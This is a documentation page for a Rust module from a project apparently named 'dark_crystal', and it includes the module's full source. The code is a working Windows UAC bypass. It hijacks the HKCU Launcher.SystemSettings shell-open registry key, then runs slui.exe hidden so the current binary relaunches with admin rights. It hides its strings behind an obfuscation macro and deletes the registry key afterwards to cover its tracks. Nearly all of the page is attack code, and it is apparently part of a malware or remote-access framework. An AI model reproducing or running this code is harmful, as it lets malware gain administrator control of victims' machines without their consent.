# uac

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/escalation/uac.rs` |
| **Lines** | 130 |
| **Cards** | T017-privilege-escalation |
| **Role** | UAC bypass via slui.exe registry |
| **Unsafe blocks** | 2 |

## Public API

### `attempt_silent_elevation` (line 16)
```rust
pub fn attempt_silent_elevation() -> Result<()>
```
Intenta elevar silenciosamente a Admin via UAC bypass.
Si ya es Admin, retorna Ok(()) inmediatamente.
Si no es Admin, envenena el registry, relanza como Admin, y termina el proceso actual.

## Internal Functions

- `create_key` (line 40)
- `cleanup_registry_hijack` — Limpia la clave de registro envenenada después de la elevación. (line 62)
- `is_elevated` (line 78)
- `trigger_uac_via_slui` (line 104)

## Key Dependencies

- `use anyhow::{bail, Context, Result};`
- `use winapi::ctypes::c_void;`
- `use winapi::um::handleapi::CloseHandle;`
- `use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};`
- `use winapi::um::securitybaseapi::GetTokenInformation;`
- `use winapi::um::shellapi::ShellExecuteW;`
- `use winapi::um::winnt::{TokenElevation, TOKEN_QUERY};`
- `use winreg::enums::HKEY_CURRENT_USER;`
- `use winapi::um::winuser::SW_HIDE;`
- `use winreg::RegKey;`

## Full Source

```rust
use anyhow::{bail, Context, Result};
use winapi::ctypes::c_void;
use std::os::windows::ffi::OsStrExt;
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::shellapi::ShellExecuteW;
use winapi::um::winnt::{TokenElevation, TOKEN_QUERY};
use winreg::enums::HKEY_CURRENT_USER;
use winapi::um::winuser::SW_HIDE;
use winreg::RegKey;

/// Intenta elevar silenciosamente a Admin via UAC bypass.
/// Si ya es Admin, retorna Ok(()) inmediatamente.
/// Si no es Admin, envenena el registry, relanza como Admin, y termina el proceso actual.
pub fn attempt_silent_elevation() -> Result<()> {
    if is_elevated()? {
        // Ya somos Admin. Limpiar cualquier rastro de elevación previa.
        cleanup_registry_hijack().ok();
        return Ok(());
    }

    // No somos Admin. Ejecutar bypass.
    create_key(Some(&crate::obf!("DelegateExecute")), "")?;

    let current_exe =
        std::env::current_exe().context("No se pudo obtener la ruta del ejecutable actual")?;
    let exe_path = current_exe.to_string_lossy().to_string();

    // Envenenar la clave Default con nuestra ruta
    create_key(None, &exe_path)?;

    // Trigger: ejecutar slui.exe que auto-eleva y ejecuta nuestro binario
    trigger_uac_via_slui()?;

    // El proceso actual se apaga; la nueva instancia Admin continúa
    std::process::exit(0);
}

fn create_key(key: Option<&str>, value: &str) -> Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = crate::obf!("Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command");

    let (reg_key, _) = hkcu
        .create_subkey(path)
        .context("No se pudo crear/abrir la clave de registro")?;

    match key {
        Some(k) => reg_key
            .set_value(k, &value)
            .context(format!("No se pudo setear clave: {}", k))?,
        None => reg_key
            .set_value("", &value)
            .context("No se pudo setear clave default")?,
    }

    Ok(())
}

/// Limpia la clave de registro envenenada después de la elevación.
/// CRÍTICO: Esto debe ser lo primero que haga la instancia Admin.
fn cleanup_registry_hijack() -> Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    // Eliminar la clave completa
    hkcu.delete_subkey_all(crate::obf!(
        "Software\\Classes\\Launcher.SystemSettings\\Shell\\Open\\Command"
    ))
    .ok(); // Ignorar error si no existe

    // También eliminar la clave padre si quedó vacía
    hkcu.delete_subkey_all(crate::obf!("Software\\Classes\\Launcher.SystemSettings"))
        .ok();

    Ok(())
}

fn is_elevated() -> Result<bool> {
    unsafe {
        let mut token = core::ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            bail!("OpenProcessToken falló");
        }

        let mut elevation: u32 = 0;
        let mut size = std::mem::size_of::<u32>() as u32;
        if GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut c_void,
            size,
            &mut size,
        ) == 0
        {
            CloseHandle(token);
            bail!("GetTokenInformation falló");
        }

        CloseHandle(token);
        Ok(elevation != 0)
    }
}

fn trigger_uac_via_slui() -> Result<()> {
    let slui_path: Vec<u16> = std::ffi::OsStr::new(&crate::obf!("C:\\Windows\\System32\\slui.exe"))
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        let result = ShellExecuteW(
            core::ptr::null_mut(),
            std::ffi::OsStr::new(&crate::obf!("runas"))
                .encode_wide()
                .chain(std::iter::once(0))
                .collect::<Vec<u16>>()
                .as_ptr(),
            slui_path.as_ptr(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            SW_HIDE, // Oculto, no mostrar ventana
        );

        if (result as usize) <= 32 {
            bail!("ShellExecuteW falló para slui.exe");
        }
    }

    Ok(())
}

```